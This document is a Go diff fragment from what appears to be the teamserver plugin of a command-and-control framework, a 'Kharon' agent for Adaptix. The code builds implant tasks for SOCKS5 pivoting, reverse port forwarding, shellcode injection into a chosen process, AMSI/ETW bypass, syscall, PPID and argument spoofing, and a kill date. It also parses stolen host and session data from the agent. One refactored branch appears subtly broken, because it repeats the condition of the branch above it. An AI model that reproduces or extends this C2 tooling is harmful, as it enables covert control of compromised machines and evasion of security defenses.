 
 		portNumber, ok := args["port"].(float64)
 		port := int(portNumber)
@@ -1299,13 +2266,13 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				goto RET
 			}
 		}
-		if subcommand == "start" {
+		switch subcommand {
+		case "start":
 			address, ok := args["address"].(string)
 			if !ok {
 				err = errors.New("parameter 'address' must be set")
 				goto RET
 			}
-			fmt.Printf("Breakpoint 2: In Start\n")
 
 			auth, _ := args["-a"].(bool)
 			if auth {
@@ -1324,13 +2291,11 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				if err != nil {
 					goto RET
 				}
-				fmt.Printf("Breakpoint 3 - FInished TsTunnelCreateSocks5\n")
 
 				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
 				if err != nil {
 					goto RET
 				}
-				fmt.Printf("Breakpoint 3 - FInished TsTunnelCreateSocks5\n")
 
 				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)
 
@@ -1349,7 +2314,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			taskData.MessageType = MESSAGE_SUCCESS
 			taskData.ClearText = "\n"
 
-		} else if subcommand == "stop" {
+		case "stop":
 			taskData.Completed = true
 
 			ts.TsTunnelStopSocks(agent.Id, port)
@@ -1358,7 +2323,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			taskData.Message = "Socks5 server has been stopped"
 			taskData.ClearText = "\n"
 
-		} else {
+		default:
 			err = errors.New("subcommand must be 'start' or 'stop'")
 			goto RET
 		}
@@ -1375,7 +2340,8 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 		}
 
-		if subcommand == "start" {
+		switch subcommand {
+		case "start":
 			fhost, ok := args["fwdhost"].(string)
 			if !ok {
 				err = errors.New("parameter 'fwdhost' must be set")
@@ -1402,7 +2368,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
 			messageData.Status = MESSAGE_INFO
 
-		} else if subcommand == "stop" {
+		case "stop":
 			taskData.Completed = true
 
 			ts.TsTunnelStopRportfwd(agent.Id, lport)
@@ -1410,7 +2376,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			taskData.MessageType = MESSAGE_SUCCESS
 			taskData.Message = "Reverse port forwarding has been stopped"
 
-		} else {
+		default:
 			err = errors.New("subcommand must be 'start' or 'stop'")
 			goto RET
 		}
@@ -1437,7 +2403,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 		chunkSize := 0x500000 // 5Mb
 		bufferSize := len(fileContent)
 
-		inTaskData := adaptix.TaskData{
+		inTaskData := ax.TaskData{
 			Type:    TYPE_TASK,
 			AgentId: agent.Id,
 			Sync:    false,
@@ -1617,7 +2583,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_PPID, int(pid)}
-		case "argue": 
+		case "argue":
 			argument, ok := args["argument"].(string)
 			if !ok {
 				err = errors.New("parameter 'argument' must be set")
@@ -1625,110 +2591,6 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_ARGUE, ConvertCpToUTF16(argument, agent.ACP)}
-		case "callback.http.host":
-			actionId, ok := args["action"].(string)
-			if !ok {
-				err = errors.New("parameter 'action' must be set")
-				goto RET
-			}
-
-			callbackAddr, ok := args["callback_host"].(string)
-			if !ok {
-				err = errors.New("parameter 'callback_host' must be set")
-				goto RET
-			}
-
-			callbackHost := ""
-			callbackPort := 0
-
-			if !strings.Contains(callbackAddr, ":") {
-				err = errors.New("callback_host must be in format 'host:port'")
-				goto RET
-			}
-
-			parts := strings.Split(callbackAddr, ":")
-			if len(parts) != 2 {
-				err = errors.New("callback_host must be in format 'host:port'")
-				goto RET
-			}
-
-			callbackHost = strings.TrimSpace(parts[0])
-			portStr := strings.TrimSpace(parts[1])
-
-			if callbackHost == "" {
-				err = errors.New("host cannot be empty")
-				goto RET
-			}
-
-			port, err := strconv.Atoi(portStr)
-			if err != nil {
-				err = errors.New("port must be a valid number")
-				goto RET
-			}
-
-			if port < 1 || port > 65535 {
-				err = errors.New("port must be between 1 and 65535")
-				goto RET
-			}
-			callbackPort = port
-
-			if strings.Contains(callbackHost, " ") {
-				err = errors.New("host cannot contain spaces")
-				goto RET
-			}
-
-			if strings.HasPrefix(callbackHost, "[") && strings.HasSuffix(callbackHost, "]") {
-				ipv6 := callbackHost[1 : len(callbackHost)-1]
-				if ipv6 == "" {
-					err = errors.New("IPv6 address cannot be empty")
-					goto RET
-				}
-			} else {
-				if len(callbackHost) > 255 {
-					err = errors.New("hostname too long")
-					goto RET
-				}
-			}
-
-			action_n := 0
-
-			if actionId == "add" {
-				action_n = 0x10
-			} else if actionId == "rm" {
-				action_n = 0x20
-			} else {
-				err = errors.New("Unknown 'action'. Use 'add' or 'rm'")
-				goto RET
-			}
-
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_HOST, int(action_n), callbackHost, callbackPort}
-		
-		case "callback.http.useragent":
-			useragent, ok := args["useragent"].(string)
-			if !ok {
-				err = errors.New("parameter 'useragent' must be set")
-				goto RET
-			}
-
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_UA, useragent}
-
-		case "callback.http.proxy":
-			proxyEnabled, ok := args["proxy_enabled"].(bool)
-			if !ok {
-				err = errors.New("parameter 'proxy_enabled' must be set")
-				goto RET
-			}
-
-			proxyUrl, ok := args["proxy_url"].(string)
-			if !ok && proxyEnabled {
-				err = errors.New("parameter 'proxy_enabled' must be set")
-				goto RET
-			}
-
-			proxyUsername := args["username"].(string)
-			proxyPassword := args["password"].(string)
-
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_PROXY, proxyEnabled, proxyUrl, proxyUsername, proxyPassword}
 		case "killdate.date":
 			dt, ok := args["date"].(string)
 			if !ok {
@@ -1750,11 +2612,12 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			enabled := 0
-			if status == "true" {
+			switch status {
+			case "true":
 				enabled = 1
-			} else if status == "false" {
+			case "false":
 				enabled = 0
-			} else {
+			default:
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
@@ -1768,11 +2631,12 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			enabled := 0
-			if method == "process" {
+			switch method {
+			case "process":
 				enabled = 1
-			} else if method == "thread" {
+			case "thread":
 				enabled = 0
-			} else {
+			default:
 				err = errors.New("unknown method type. Type must be 'process' or 'thread'")
 				goto RET
 			}
@@ -1786,11 +2650,12 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			num := 0
-			if tp == "timer" {
+			switch tp {
+			case "timer":
 				num = 1
-			} else if tp == "none" {
+			case "none":
 				num = 3
-			} else {
+			default:
 				err = errors.New("unknown mask type. Type must be 'none' or 'timer'")
 				goto RET
 			}
@@ -1804,11 +2669,12 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			enabled := 0
-			if status == "true" {
+			switch status {
+			case "true":
 				enabled = 1
-			} else if status == "false" {
+			case "false":
 				enabled = 0
-			} else {
+			default:
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
@@ -1830,11 +2696,12 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			enabled := 0
-			if status == "true" {
+			switch status {
+			case "true":
 				enabled = 1
-			} else if status == "false" {
+			case "false":
 				enabled = 0
-			} else {
+			default:
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
@@ -1849,15 +2716,16 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				}
 
 				bypass_n := 0
-				if bypass == "amsi" {
+				switch bypass {
+				case "amsi":
 					bypass_n = 0x700
-				} else if bypass == "etw" {
+				case "etw":
 					bypass_n = 0x400
-				} else if bypass == "all" {
+				case "all":
 					bypass_n = 0x100
-				} else if bypass == "none" {
+				case "none":
 					bypass_n = 0x000
-				} else {
+				default:
 					err = errors.New("unknown bypass type. Type must be 'amsi', 'etw', 'all' or 'none'")
 					goto RET
 				}
@@ -1865,61 +2733,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				array = []interface{}{TASK_CONFIG, 1, CONFIG_AE_BYPASS, int(bypass_n)}
 			}
 
-		case "inject.alloc":
-			alloc, ok := args["alloc"].(string)
-			if !ok {
-				err = errors.New("parameter 'alloc' must be set")
-				goto RET
-			}
-
-			alloc_n := 0
-			if alloc == "drip" {
-				alloc_n = 1
-			} else if alloc == "standard" {
-				alloc_n = 0
-			} else {
-				err = errors.New("unknown alloc type. Type must be 'drip' or 'standard'")
-				goto RET
-			}
-
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_ALLOC, int(alloc_n)}
-		case "inject.write":
-			write, ok := args["write"].(string)
-			if !ok {
-				err = errors.New("parameter 'write' must be set")
-				goto RET
-			}
-
-			write_n := 0
-			if write == "apc" {
-				write_n = 1
-			} else if write == "standard" {
-				write_n = 0
-			} else {
-				err = errors.New("unknown write type. Type must be 'apc' or 'standard")
-				goto RET
-			}
-
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_WRITE, int(write_n)}
-		case "inject.technique":
-			techniqueInj, ok := args["technique"].(string)
-			if !ok {
-				err = errors.New("parameter 'technique' must be set")
-				goto RET
-			}
-
-			technique_n := 0
-			if ( techniqueInj == "standard" ) {
-				technique_n = 0x10
-			} else if ( techniqueInj == "stomping" ) {
-				technique_n = 0x20
-			} else {
-				err = errors.New("unknown technique. must be 'standard' or 'stomping'")
-			}
-
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_TECHN, int(technique_n)}
-		
-		case "syscall": 
+		case "syscall":
 			syscall, ok := args["syscall"].(string)
 			if !ok {
 				err = errors.New("parameter 'syscall' must be set")
@@ -1939,7 +2753,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_SYSCALL, int(syscall_n)}
-		case "fork_pipe_name": 
+		case "fork_pipe_name":
 			forkPipeName := args["name"].(string)
 			if !ok {
 				err = errors.New("parameter 'name' must be set")
@@ -1947,14 +2761,14 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_FORKPIPE, forkPipeName}
-		
-		case "inject.stompmodule": 
-			module, ok := args["module"].(string)
+
+		case "bofproxy":
+			status, ok := args["status"].(bool)
 			if !ok {
-				err = errors.New("parameter 'module' must be set")
+				err = errors.New("parameter 'status' must be set")
 			}
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_STOMP, ConvertCpToUTF16(module, agent.ACP)}
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_BOFPROXY, status}
 		default:
 			err = errors.New("invalid sub command")
 			goto RET
@@ -1997,8 +2811,6 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'bof' must be set")
 				goto RET
 			}
-
-			fmt.Printf("bof file path: %s\n", bofFile)
 
 			if strings.Contains(bofFile, "kharon_replace_folder") {
 				bofFile = strings.ReplaceAll(bofFile, "kharon_replace_folder", postex_path)
@@ -2057,38 +2869,38 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				}
 			}
 
-		scFile, ok := args["sc_file"].(string)
-		if !ok {
-			err = errors.New("parameter 'sc_file' must be set")
-			goto RET
-		}
+			scFile, ok := args["sc_file"].(string)
+			if !ok {
+				err = errors.New("parameter 'sc_file' must be set")
+				goto RET
+			}
 
-		explicitPid := 0
-		if pidVal, ok := args["pid"]; ok {
-			if pidInt, ok := pidVal.(int); ok {
-				explicitPid = pidInt
+			explicitPid := 0
+			if pidVal, ok := args["pid"]; ok {
+				if pidInt, ok := pidVal.(int); ok {
+					explicitPid = pidInt
+				} else {
+					if pidFloat, ok := pidVal.(float64); ok {
+						explicitPid = int(pidFloat)
+					}
+				}
 			} else {
-				if pidFloat, ok := pidVal.(float64); ok {
-					explicitPid = int(pidFloat)
+				fmt.Printf("[DEBUG] pid arg does NOT exist in args map\n")
+			}
+
+			scContent, err := base64.StdEncoding.DecodeString(scFile)
+			if err != nil {
+				goto RET
+			}
+
+			var params []byte
+			paramData, ok := args["param_data"].(string)
+			if ok {
+				params, err = base64.StdEncoding.DecodeString(paramData)
+				if err != nil {
+					params = []byte(paramData)
 				}
 			}
-		} else {
-			fmt.Printf("[DEBUG] pid arg does NOT exist in args map\n")
-		}
-
-		scContent, err := base64.StdEncoding.DecodeString(scFile)
-		if err != nil {
-			goto RET
-		}
-
-		var params []byte
-		paramData, ok := args["param_data"].(string)
-		if ok {
-			params, err = base64.StdEncoding.DecodeString(paramData)
-			if err != nil {
-				params = []byte(paramData)
-			}
-		}
 
 			array = []interface{}{TASK_POSTEX, int(method_n), int(fork_type_n), int(explicitPid), len(scContent), scContent, len(params), params}
 		default:
@@ -2111,8 +2923,8 @@ RET:
 	return taskData, messageData, err
 }
 
-func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
-	var outTasks []adaptix.TaskData
+func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskData, packedData []byte) []ax.TaskData {
+	var outTasks []ax.TaskData
 
 	/// START CODE
 
@@ -2134,7 +2946,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 	for taskIndex := uint(0); taskIndex < taskCount && packer.CheckPacker([]string{"int"}); taskIndex++ {
 		dataType := packer.ParseInt32()
 
-		if dataType == 0x5 || dataType == 0x7 { // QuickMsg || QuickOut
+		if dataType == uint(MSG_QUICK) || dataType == uint(MSG_OUT) { 
 			if len(packer.buffer) < 16 {
 				return outTasks
 			}
@@ -2156,40 +2968,38 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 			outputType := packer.ParseInt32()
 
-			if outputType == CALLBACK_ERROR {
+			switch outputType {
+			case CALLBACK_ERROR:
 				output := packer.ParseString()
 
 				task.MessageType = MESSAGE_ERROR
-				// task.Message = "BOF output"
 				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
 
-			} else if outputType == CALLBACK_SCREENSHOT {
+			case CALLBACK_SCREENSHOT:
 				task.MessageType = MESSAGE_SUCCESS
 				screenBuff := packer.ParseBytes()
 				ts.TsScreenshotAdd(agentData.Id, "", screenBuff)
-			} else if outputType == CALLBACK_OUTPUT_OEM {
+			case CALLBACK_OUTPUT_OEM:
 				output := packer.ParseString()
 
 				task.MessageType = MESSAGE_SUCCESS
-				// task.Message = "BOF output"
 				task.ClearText = ConvertCpToUTF8(output, agentData.OemCP)
 
-			} else if outputType == CALLBACK_NO_PRE_MSG {
+			case CALLBACK_NO_PRE_MSG:
 				output := packer.ParseString()
 
 				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
-			} else {
+			default:
 				output := packer.ParseString()
 
 				task.MessageType = MESSAGE_SUCCESS
-				// task.Message = "BOF output"
 				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
 			}
 
 			task.Completed = false
 			outTasks = append(outTasks, task)
 
-		} else if dataType == 0x25 || dataType == 0x15 { // web || smb
+		} else if dataType == uint(MSG_QUICK) || dataType == uint(MSG_OUT) { // web || smb
 
 			if false == packer.CheckPacker([]string{"array"}) {
 				return outTasks
@@ -2278,7 +3088,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 								ps_data_list = append(ps_data_list, ps_item)
 							}
 
-							var proclist []adaptix.ListingProcessDataWin
+							var proclist []ax.ListingProcessDataWin
 
 							if len(ps_data_list) == 0 {
 								errorCode := packer.ParseInt32()
@@ -2290,7 +3100,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 								processMaxSize := 20
 
 								for _, item := range ps_data_list {
-									procData := adaptix.ListingProcessDataWin{
+									procData := ax.ListingProcessDataWin{
 										Pid:         item.pid,
 										Ppid:        item.ppid,
 										SessionId:   item.sessid,
@@ -2332,7 +3142,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 									} else if parent, ok := procMap[node.Data.ppid]; ok {
 										parent.Children = append(parent.Children, node)
 									} else {
-										roots = append(roots, node) 
+										roots = append(roots, node)
 									}
 								}
 
@@ -2476,7 +3286,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 									}
 								}
 
-								var ui_items []adaptix.ListingFileDataWin
+								var ui_items []ax.ListingFileDataWin
 
 								data_full := append(data_directory, data_files...)
 								if len(data_full) == 0 {
@@ -2495,7 +3305,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 										t, _ := time.Parse("02/01/2006 15:04:05", item.writeDate)
 
-										fileData := adaptix.ListingFileDataWin{
+										fileData := ax.ListingFileDataWin{
 											IsDir:    item.dir,
 											Size:     int64(item.size),
 											Date:     t.Unix(),
@@ -2621,399 +3431,6 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 					task.Message = "The agent has completed its work"
 					_ = ts.TsAgentTerminate(agentData.Id, task.TaskId)
-
-				case TASK_GETINFO:
-
-					// session info
-					sleep_time := int(cmd_packer.ParseInt32())
-					jitter_time := int(cmd_packer.ParseInt32())
-
-					mask_tech_id := int(cmd_packer.ParseInt32())
-					heap_obf := uint32(cmd_packer.ParseInt32())
-					jmp_gadget := cmd_packer.ParseInt64()
-					ntcont_gadget := cmd_packer.ParseInt64()
-
-					bof_hook := uint32(cmd_packer.ParseInt32())
-					syscall := int(cmd_packer.ParseInt32())
-					amsietwbp := int(cmd_packer.ParseInt32())
-
-					block_dlls := uint32(cmd_packer.ParseInt32())
-					spoof_arg := cmd_packer.ParseBytes()
-					parent_pid := int(cmd_packer.ParseInt32())
-					use_pipe := uint32(cmd_packer.ParseInt32())
-
-					fork_pipe_name := cmd_packer.ParseString()
-					fork_spawn_to := cmd_packer.ParseString()
-
-					agent_id := cmd_packer.ParseString()
-					img_path := cmd_packer.ParseString()
-					cmd_line := cmd_packer.ParseString()
-					process_id := int(cmd_packer.ParseInt32())
-					thread_id := int(cmd_packer.ParseInt32())
-					parent_id := int(cmd_packer.ParseInt32())
-					elevated := uint32(cmd_packer.ParseInt32())
-					h_heap := cmd_packer.ParseInt64()
-					proc_arch := int(cmd_packer.ParseInt32())
-					kh_start := cmd_packer.ParseInt64()
-					kh_size := int(cmd_packer.ParseInt32())
-
-					user_name := cmd_packer.ParseString()
-					comp_name := cmd_packer.ParseString()
-					domn_name := cmd_packer.ParseString()
-					cfg_enabled := cmd_packer.ParseInt32()
-					os_arch := cmd_packer.ParseInt8()
-					os_major := cmd_packer.ParseInt32()
-					os_minor := cmd_packer.ParseInt32()
-					os_build := cmd_packer.ParseInt32()
-
-					killdate_use := uint32(cmd_packer.ParseInt32())
-					killdate_sdel := uint32(cmd_packer.ParseInt32())
-					killdate_proc := uint32(cmd_packer.ParseInt32())
-					killdate_day := cmd_packer.ParseInt32()
-					killdate_mont := cmd_packer.ParseInt32()
-					killdate_year := cmd_packer.ParseInt32()
-
-
-					injection_techn := int(cmd_packer.ParseInt32())
-					injection_stomp_module := cmd_packer.ParseBytes()
-					injection_alloc := int(cmd_packer.ParseInt32())
-					injection_write := int(cmd_packer.ParseInt32())
-
-					// transport
-					profileC2 := int32(cmd_packer.ParseInt32())
-
-					webHostQtt := cmd_packer.ParseInt32()
-					webPortQtt := cmd_packer.ParseInt32()
-					webEndpQtt := cmd_packer.ParseInt32()
-
-					webMethod := cmd_packer.ParseString()
-					webUseragt := cmd_packer.ParseString()
-					webHeaders := cmd_packer.ParseString()
-					webSecure := uint32(cmd_packer.ParseInt32())
-					webProxyEbl := uint32(cmd_packer.ParseInt32())
-					webProxyUrl := cmd_packer.ParseString()
-					webProxyUser := cmd_packer.ParseString()
-					webProxyPass := cmd_packer.ParseString()
-					
-					webHostList := make([]string, webHostQtt)
-					webPortList := make([]int,    webPortQtt)
-					webEndpList := make([]string, webEndpQtt)
-
-					for webTargetIdx := 0; webTargetIdx < int(webHostQtt); webTargetIdx++ {
-						webHostList[webTargetIdx] = cmd_packer.ParseString()
-						webPortList[webTargetIdx] = int(cmd_packer.ParseInt32())
-					}
-
-					for webEndpIdx := 0; webEndpIdx < int(webEndpQtt); webEndpIdx++ {
-						webEndpList[webEndpIdx] = cmd_packer.ParseString()
-					}
-
-					maskTechStr := func(id int) string {
-						switch id {
-						case 1:
-							return "Timer"
-						case 2:
-							return "Pooling"
-						case 3:
-							return "None"
-						default:
-							return fmt.Sprintf("%d", mask_tech_id)
-						}
-					}
-
-					getFilenameFromPath := func(path string) string {
-						if path == "" {
-							return "Unknown"
-						}
-						
-						normalizedPath := strings.ReplaceAll(path, "\\", "/")
-						
-						lastSlash := strings.LastIndex(normalizedPath, "/")
-						if lastSlash == -1 {
-							return path
-						}
-						
-						filename := normalizedPath[lastSlash+1:]
-						
-						filename = strings.TrimSpace(filename)
-						
-						if filename == "" {
-							return "Unknown"
-						}
-						
-						return filename
-					}
-
-					amsietwbpStr := func(id int) string {
-						switch id {
-						case 0x100: 
-							return "All"
-						case 0x700:
-							return "AMSI"
-						case 0x400: 
-							return "ETW"
-						case 0x000:
-							return "None"
-						default:
-							return fmt.Sprintf("0x%03X", id)
-						}
-					}
-
-					syscallStr := func(sys int) string {
-						switch sys {
-						case 0:
-							return "None"
-						case 1:
-							return "Spoof"
-						case 2:
-							return "Spoof + Indirect"
-						default:
-							return fmt.Sprintf("%d", syscall)
-						}
-					}
-
-					injectTechnStr := func(id int) string {
-						switch id {
-						case 0x10:
-							return "Standard"
-						case 0x20:
-							return "Stomping"
-						default:
-							return fmt.Sprintf("%d", id)
-						}
-					}
-
-					injectWriteStr := func(id int) string {
-						switch id {
-						case 0:
-							return "Standard"
-						case 1:
-							return "APC"
-						default:
-							return fmt.Sprintf("%d", id)
-						}
-					}
-
-					injectAllocStr := func(id int) string {
-						switch id {
-						case 0:
-							return "Standard"
-						case 1:
-							return "Drip"
-						default:
-							return fmt.Sprintf("%d", id)
-						}
-					}
-
-					boolStr := func(b uint32) string {
-						if b != 0 {
-							return "True"
-						}
-						return "False"
-					}
-
-					profileTypeStr := func(profile int32) string {
-						switch profile {
-						case 0:
-							return "HTTP/HTTPS"
-						case 1:
-							return "DNS"
-						case 2:
-							return "SMB"
-						case 3:
-							return "DOH"
-						default:
-							return fmt.Sprintf("%d", profile)
-						}
-					}
-
-					formatCallbackHosts := func(hosts []string, ports []int) string {
-						if len(hosts) == 0 || len(ports) == 0 {
-							return ""
-						}
-						
-						var pairs []string
-						for i := 0; i < len(hosts) && i < len(ports); i++ {
-							if hosts[i] != "" && ports[i] != 0 {
-								pairs = append(pairs, fmt.Sprintf("%s:%d", hosts[i], ports[i]))
-							}
-						}
-						
-						if len(pairs) == 0 {
-							return ""
-						}
-						
-						return fmt.Sprintf("[%s]", strings.Join(pairs, ", "))
-					}
-
-					formatHeaders := func(headers string) string {
-						if headers == "" {
-							return ""
-						}
-						
-						headerLines := strings.Split(headers, "\n")
-						var cleanHeaders []string
-						
-						for _, h := range headerLines {
-							h = strings.TrimSpace(h)
-							h = strings.ReplaceAll(h, "\r", "")
-							if h != "" {
-								cleanHeaders = append(cleanHeaders, h)
-							}
-						}
-						
-						if len(cleanHeaders) == 0 {
-							return "None"
-						}
-						
-						result := "[" + strings.Join(cleanHeaders, ", ") + "]"
-						
-						if len(result) > 85 {
-							var formatted strings.Builder
-							formatted.WriteString("[")
-							for i, h := range cleanHeaders {
-								if i > 0 {
-									formatted.WriteString(", ")
-								}
-								if formatted.Len()+len(h) > 85 && i > 0 {
-									// formatted.WriteString("\n")
-									
-									formatted.WriteString(" ")
-								}
-								formatted.WriteString(h)
-							}
-							formatted.WriteString("]")
-							return formatted.String()
-						}
-						
-						return result
-					}
-
-					formatEndpoints := func(endpoints []string) string {
-						if len(endpoints) == 0 {
-							return "None"
-						}
-						
-						result := "[" + strings.Join(endpoints, ", ") + "]"
-						
-						if len(result) > 85 {
-							var formatted strings.Builder
-							formatted.WriteString("[")
-							for i, endpoint := range endpoints {
-								if i > 0 {
-									formatted.WriteString(", ")
-								}
-								if formatted.Len()+len(endpoint) > 85 && i > 0 {
-									// formatted.WriteString("\n")
-									formatted.WriteString(" ")
-								}
-								formatted.WriteString(endpoint)
-							}
-							formatted.WriteString("]")
-							return formatted.String()
-						}
-						
-						return result
-					}
-
-					killdateStr := fmt.Sprintf("%02d/%02d/%04d", killdate_day, killdate_mont, killdate_year)
-					osVersionStr := fmt.Sprintf("%d.%d.%d", os_major, os_minor, os_build)
-
-					w1, w2, w3 := 20, 20, 90
-
-					border := "+" +
-						strings.Repeat("-", w1+2) + "+" +
-						strings.Repeat("-", w2+2) + "+" +
-						strings.Repeat("-", w3+2) + "+\n"
-
-					row := func(c1, c2, c3 string) string {
-						return fmt.Sprintf("| %-*s | %-*s | %-*s |\n", w1, c1, w2, c2, w3, c3)
-					}
-
-					var b strings.Builder
-
-					b.WriteString(border)
-
-					// TIMING
-					b.WriteString(row("TIMING", "Sleep Time", fmt.Sprintf("%dms", sleep_time)))
-					b.WriteString(row("", "Jitter Time", fmt.Sprintf("%d%%", jitter_time)))
-					b.WriteString(border)
-
-					// EVASION
-					b.WriteString(row("EVASION", "Mask Beacon", maskTechStr(mask_tech_id)))
-					b.WriteString(row("", "Heap Mask", boolStr(heap_obf)))
-					b.WriteString(row("", "Block DLLs", boolStr(block_dlls)))
-					b.WriteString(row("", "Jump Gadget", fmt.Sprintf("0x%016X", jmp_gadget)))
-					b.WriteString(row("", "NtContinue Gadget", fmt.Sprintf("0x%016X", ntcont_gadget)))
-					b.WriteString(row("", "BOF API Proxy", boolStr(bof_hook)))
-					b.WriteString(row("", "Syscall", syscallStr(syscall)))
-					b.WriteString(row("", "AMSI/ETW Bypass", amsietwbpStr(amsietwbp)))
-					b.WriteString(border)
-
-					// INJECTION
-					b.WriteString(row("INJECTION", "Injection Technique", injectTechnStr(injection_techn)))
-					b.WriteString(row("", "Stomp Module", string(injection_stomp_module)))
-					b.WriteString(row("", "Allocation Method", injectAllocStr(injection_alloc)))
-					b.WriteString(row("", "Write Method", injectWriteStr(injection_write)))
-					b.WriteString(border)
-
-					// SESSION
-					b.WriteString(row("SESSION", "Agent ID", agent_id[:8]))
-					b.WriteString(row("", "Image Name", getFilenameFromPath(img_path)))
-					b.WriteString(row("", "Image Path", img_path))
-					b.WriteString(row("", "Command Line", cmd_line))
-					b.WriteString(row("", "Process ID", fmt.Sprintf("%d", process_id)))
-					b.WriteString(row("", "Thread ID", fmt.Sprintf("%d", thread_id)))
-					b.WriteString(row("", "Parent ID", fmt.Sprintf("%d", parent_id)))
-					b.WriteString(row("", "Elevated", boolStr(elevated)))
-					b.WriteString(row("", "Heap Handle", fmt.Sprintf("0x%016X", h_heap)))
-					b.WriteString(row("", "Process Arch", fmt.Sprintf("0x%02X", proc_arch)))
-					b.WriteString(row("", "Kharon Memory Base", fmt.Sprintf("0x%016X", kh_start)))
-					b.WriteString(row("", "Kharon Memory Size", fmt.Sprintf("%d bytes", kh_size)))
-					b.WriteString(border)
-
-					// FORK & SPAWN
-					b.WriteString(row("FORK & SPAWN", "Parent PID", fmt.Sprintf("%d", parent_pid)))
-					b.WriteString(row("", "Use Pipe", boolStr(use_pipe)))
-					b.WriteString(row("", "Spoof Argument", string(spoof_arg)))
-					b.WriteString(row("", "Fork Pipe", fork_pipe_name))
-					b.WriteString(row("", "Fork Spawn To", fork_spawn_to))
-					b.WriteString(border)
-
-					// SYSTEM INFO
-					b.WriteString(row("SYSTEM INFO", "User Name", user_name))
-					b.WriteString(row("", "Computer Name", comp_name))
-					b.WriteString(row("", "Domain Name", domn_name))
-					b.WriteString(row("", "CFG Status", boolStr(uint32(cfg_enabled))))
-					b.WriteString(row("", "OS Arch", fmt.Sprintf("0x%02X", os_arch)))
-					b.WriteString(row("", "OS Version", osVersionStr))
-					b.WriteString(border)
-
-					// KILLDATE
-					b.WriteString(row("KILLDATE", "Use Killdate", boolStr(killdate_use)))
-					b.WriteString(row("", "Self Delete", boolStr(killdate_sdel)))
-					b.WriteString(row("", "Kill Process", boolStr(killdate_proc)))
-					b.WriteString(row("", "Date", killdateStr))
-					b.WriteString(border)
-
-					// WEB PROFILE
-					b.WriteString(row("WEB PROFILE", "Profile Type", profileTypeStr(profileC2)))
-					b.WriteString(row("", "Callback Hosts", formatCallbackHosts(webHostList, webPortList)))
-					b.WriteString(row("", "Endpoints", formatEndpoints(webEndpList)))
-					b.WriteString(row("", "Method", webMethod))
-					b.WriteString(row("", "User Agent", webUseragt))
-					b.WriteString(row("", "Headers", formatHeaders(webHeaders)))
-					b.WriteString(row("", "SSL/TLS", boolStr(webSecure)))
-					b.WriteString(row("", "Proxy Enabled", boolStr(webProxyEbl)))
-					b.WriteString(row("", "Proxy URL", webProxyUrl))
-					b.WriteString(row("", "Proxy Username", webProxyUser))
-					b.WriteString(row("", "Proxy Password", webProxyPass))
-					
-					b.WriteString(border)
-
